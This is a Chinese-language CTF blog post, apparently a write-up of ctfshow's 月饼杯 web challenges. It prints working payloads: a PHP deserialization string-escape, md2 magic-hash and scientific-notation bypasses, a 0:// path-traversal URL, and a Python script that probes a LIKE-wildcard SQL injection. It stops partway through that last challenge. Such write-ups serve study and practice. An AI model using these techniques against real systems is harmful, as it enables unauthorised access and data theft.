@@ -1,0 +1,291 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ctfshow-月饼杯1 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="web1_此夜圆下载index.php的源码：
+123456789101112131415161718192021222324252627282930313233343536&amp;lt;?phperro,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ctfshow-月饼杯1</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ctfshow-月饼杯1</h1>
+        <div class="stuff">
+            <span>十月 05, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" rel="tag">题目复现</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="web1-此夜圆"><a href="#web1-此夜圆" class="headerlink" title="web1_此夜圆"></a>web1_此夜圆</h3><p>下载index.php的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$uname</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;uname=<span class="variable">$uname</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;password=<span class="variable">$password</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;yu22x&#x27;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">				<span class="keyword">echo</span> <span class="variable">$flag</span>;	</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;Firebasky&#x27;</span>,<span class="string">&#x27;Firebaskyup&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$uname</span>=<span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ser</span>=filter(serialize(<span class="keyword">new</span> a(<span class="variable">$uname</span>,<span class="variable">$password</span>)));</span><br><span class="line"><span class="variable">$test</span>=unserialize(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="进行代码审计"><a href="#进行代码审计" class="headerlink" title="进行代码审计"></a>进行代码审计</h4><p>首先观察到存在unserialize()函数，考虑PHP的反序列化；发现filter()函数将替换字符的字符串长度增多了，可以猜测题目为反序列化字符串逃逸中字符串增加的情况。定义了一个类a，其中有__construct()方法和__wakeup()方法，当密码为yu22x的时候，输出flag；filter()方法会将传进来的参数中含有’Firebasky’的，将其替换为’Firebaskyup’，字符串长度增加了2。实例化一个类a，传递$uname和$password两个参数，对其实例化的类进行序列化后通过filter()函数的过滤，最后将其进行反序列化。</p>
+<h4 id="题目的具体分析"><a href="#题目的具体分析" class="headerlink" title="题目的具体分析"></a>题目的具体分析</h4><ul>
+<li>$uname为get方法获得的变量1的值，参数可控；定义了password为1，但是代码的意思是说当密码强等于yu22x的时候，才能输出flag。因此，我们需要构造一个序列化的结果，让其反序列化后得到的密码为yu22x。那么这个过程怎么实现呢？这里就要用到PHP反序列化字符串逃逸的知识点。</li>
+</ul>
+<p>按照代码的意思，我们尝试给$uname传一个值admin，password为代码规定的值1，查看实例化后进行序列化的结果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$uname</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>=<span class="number">1</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> a();</span><br><span class="line"><span class="variable">$ser</span>=serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是题目又要求当密码为yu22x的时候才给我们输出flag值，因此我们尝试将password改为yu22x，查看一下序列化的结果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;uname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;yu22x&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>因此如果我们可以把password这一个原有为1的序列化字符串替换成我们需要的yu22x，那么在进行反序列化时就可以得到正确的密码为yu22x。我们发现序列化的结果会经过filter()函数进行过滤，且会将其中的’Firebasky’替换为多了两个字符长度的’Firebaskyup’，按照反序列化字符串变长的逃逸原理，又因为用户名$uname处可控，我们可以传入限定个’Firebasky’以及我们需要构造的密码字符串**”;s:8:”password”;s:5:”yu22x”;}<strong>，当经过函数过滤时，字符串变长，空间变长，我们构造的</strong>“;s:8:”password”;s:5:”yu22x”;}** 就能成功被挤到password数据项读取，根据反序列化读数据的规律，遇到;}即为结束，因为原本的<strong>s:8:”password”;i:1;}</strong> 就被舍弃掉了。</li>
+</ul>
+<ul>
+<li>可以看到需要逃逸的字符共有30位，因此我们尝试在uname处传入15个’Firebaskyup’和构造的**”;s:8:”password”;s:5:”yu22x”;}**，字符串变长增加30个字符长度，刚好和需要逃逸出来的（我们构造的）字符长度一样：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$uname</span>=<span class="string">&#x27;FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;yu22x&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;Firebasky&#x27;</span>,<span class="string">&#x27;Firebaskyup&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> a();</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>=serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$sseerr</span>=filter(serialize(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sseerr</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:165:&quot;FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125; </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  </span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:165:&quot;FirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyup&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>根据上述结果：uname的内容长度为165，经过过滤函数之后，刚好将前面的Firebaskyup读完，剩下的”;s:8:”password”;s:5:”yu22x”;}成功逃逸！被挤到password处的数据项进行处理，因此满足了题目的要求。</p>
+</li>
+<li><p>我们尝试将反序列化的结果打印出来：</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a <span class="keyword">Object</span></span><br><span class="line">(</span><br><span class="line">    [uname] =&gt; FirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyup</span><br><span class="line">    [password] =&gt; yu22x</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>发现密码确实被修改为了我们想要的值。因此，我们尝试对题目进行传参：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="number">1</span>=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:5:&quot;</span>yu22x<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag。</p>
+<h3 id="web2-故人心"><a href="#web2-故人心" class="headerlink" title="web2_故人心"></a>web2_故人心</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$url</span>[<span class="number">1</span>]=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$a</span>) <span class="keyword">and</span> strlen(<span class="variable">$a</span>)&lt;<span class="number">7</span> <span class="keyword">and</span> <span class="variable">$a</span>!=<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>**<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$d</span> = (<span class="variable">$b</span>==hash(<span class="string">&quot;md2&quot;</span>, <span class="variable">$b</span>)) &amp;&amp; (<span class="variable">$c</span>==hash(<span class="string">&quot;md2&quot;</span>,hash(<span class="string">&quot;md2&quot;</span>, <span class="variable">$c</span>)));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$d</span>)&#123;</span><br><span class="line">             highlight_file(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">             <span class="keyword">if</span>(filter_var(<span class="variable">$url</span>[<span class="number">1</span>],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                <span class="variable">$host</span>=parse_url(<span class="variable">$url</span>[<span class="number">1</span>]);</span><br><span class="line">                print_r(<span class="variable">$host</span>); </span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow\.com$/&#x27;</span>,<span class="variable">$host</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">                    print_r(file_get_contents(<span class="variable">$url</span>[<span class="number">1</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;差点点就成功了！&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;please give me url!!!&#x27;</span>;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;想一想md5碰撞原理吧?!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;第一个都过不了还想要flag呀?!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">第一个都过不了还想要flag呀?!</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h4><p>一个个地绕过条件的限制，应该就能得到flag。</p>
+<h5 id="首先是第一个点"><a href="#首先是第一个点" class="headerlink" title="首先是第一个点"></a>首先是第一个点</h5><p>我们需要传一个数字或数字字符串$a，它的长度必须小于7，且a不能等于0，但是乘2之后需要等于0。那么我们考虑传一个很小很小的数：0.00000000000000000000001这种，但是长度不符合要求。考虑科学计数法：</p>
+<p>payload：<strong>1e-200</strong></p>
+<p>这个长度要有限制的，即1e-162到1e-323超过323位会失效。</p>
+<h5 id="第二点"><a href="#第二点" class="headerlink" title="第二点"></a>第二点</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$d</span> = (<span class="variable">$b</span>==hash(<span class="string">&quot;md2&quot;</span>, <span class="variable">$b</span>)) &amp;&amp; (<span class="variable">$c</span>==hash(<span class="string">&quot;md2&quot;</span>,hash(<span class="string">&quot;md2&quot;</span>, <span class="variable">$c</span>)));</span><br></pre></td></tr></table></figure>
+
+
+
+<p>题目在robots.txt处存在一个hint：</p>
+<p><img src="1.png"></p>
+<p>在2020的强网杯中出现过md4，平时见得最多的是md5，根据代码的相似，我们尝试传两个0e开头的md2加密的值进行绕过。此处$b为经过一次md2加密后为0e开头，c为经过两次md2加密为为0e开头。</p>
+<p>根据题目，可以通过写脚本进行值的爆破：（不会写脚本就只能用别人的呗，能看得懂，但是自己还写不来）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">999999</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">  <span class="variable">$b</span>=hash(<span class="string">&quot;md2&quot;</span>, <span class="string">&#x27;0e&#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;024452&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(is_numeric(<span class="variable">$b</span>)&amp;&amp;substr(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">2</span>)===<span class="string">&#x27;0e&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$c</span>= hash(<span class="string">&quot;md2&quot;</span>,hash(<span class="string">&quot;md2&quot;</span>,<span class="string">&#x27;0e&#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;48399&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$c</span>)&amp;&amp;substr(<span class="variable">$c</span>,<span class="number">0</span>,<span class="number">2</span>)===<span class="string">&#x27;0e&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="2.png"></p>
+<p>得到b=0e652024452&amp;c=0e603448399；</p>
+<h4 id="第三个点"><a href="#第三个点" class="headerlink" title="第三个点"></a>第三个点</h4><p>我们post传进来的参数必须要满足filter_var()对url的过滤要求。</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-filter-var.html">filter_var()函数是通过指定的过滤器过滤一个变量。</a><br> <a target="_blank" rel="noopener" href="https://www.runoob.com/php/filter-validate-url.html">FILTER_VALIDATE_URL过滤器</a><br> <a target="_blank" rel="noopener" href="https://www.php.net/parse_url">parse_url是解析 URL，返回其组成部分</a></p>
+<p>因此代码的意思就是我们传进来的参数需要满足url的形式，并且返回的[host]部分必须为ctfshow。这是涉及到的一个点是，在php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。</p>
+<p>所以在这个题目中我们构造0://ctfshow，0:/被PHP识别为一个目录，ctfshow也被当做一层目录，又因为读取是从根目录开始读取的，因此可以通过../返回上层目录，依次添加../进行目录的穿越，读取根目录下的文件。</p>
+<p>这里无法使用http://，这是因为filter_var()拒绝以主机名和“HTTP”作为schema验证所请求的url，具体的内容大家可以参考这篇文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/101058/">https://www.anquanke.com/post/id/101058/</a></p>
+<p>这里通过filter_var()和file_get_contents使用不存在的协议名导致目录穿越。</p>
+<p><strong>payload:</strong>  </p>
+<p><strong>url=0://ctfshow.com/../../../../../fl0g.txt</strong></p>
+<p><img src="3.png"></p>
+<h5 id="文章参考"><a href="#文章参考" class="headerlink" title="文章参考"></a>文章参考</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108570212">https://blog.csdn.net/qq_46091464/article/details/108570212</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/101058/">https://www.anquanke.com/post/id/101058/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12580978.html">https://www.cnblogs.com/yesec/p/12580978.html</a></p>
+<h3 id="web3-莫负婵娟"><a href="#web3-莫负婵娟" class="headerlink" title="web3_莫负婵娟"></a>web3_莫负婵娟</h3><p>点开时一个登陆框：</p>
+<p><img src="4.png"></p>
+<p>F12发现有提示：</p>
+<p><img src="5.png"></p>
+<p>得到用户名为yu22x，SQL语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里我是没有思路的，没有接触过like的模糊匹配，通过这道题，又积累了一个知识点。</p>
+<p>like模糊查询可以通过通配符进行匹配：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">% 表示零个或多个字符的任意字符串</span><br><span class="line">_（下划线）表示任何单个字符</span><br><span class="line">[ ] 表示指定范围 ([a-f]) 或集合 ([abcdef]) 中的任何单个字符</span><br><span class="line">[^] 不属于指定范围 ([a-f]) 或集合 ([abcdef]) 的任何单个字符</span><br><span class="line"></span><br><span class="line">* 它同于DOS命令中的通配符，代表多个字符</span><br><span class="line">?  同于DOS命令中的？通配符，代表单个字符</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+
+
+
+<p>因此这里我们也可以使用通配符进行匹配：fuzz发现%被过滤了，但是下划线没得，我们可以尝试使用下划线进行注入。</p>
+<p>因此需要知道密码的位数，用脚本进行爆破：（抄的dalao的脚本）</p>
+<p>如果小于或大于32个<code>_</code>都会返回wrong username or password。只有正确匹配才会显示I have filtered all the characters. Why can you come in? get out!</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://181212cc-c071-4223-a4d7-5c3f4b556aac.challenge.ctf.show:8080/login.php&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;yu22x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&#123;0&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">req = requests.post(url=url, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;yu22x&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;a&quot;</span>)&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(req.text))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    req = requests.post(url=url, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;yu22x&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;_&quot;</span> * i)&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(req.text) != <span class="number">52</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 长度为&quot;</span>, i)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>得到密码长度为32位，但是不能直接用32个下划线作为密码进行注入，因此需要爆破出真实的密码：</p>
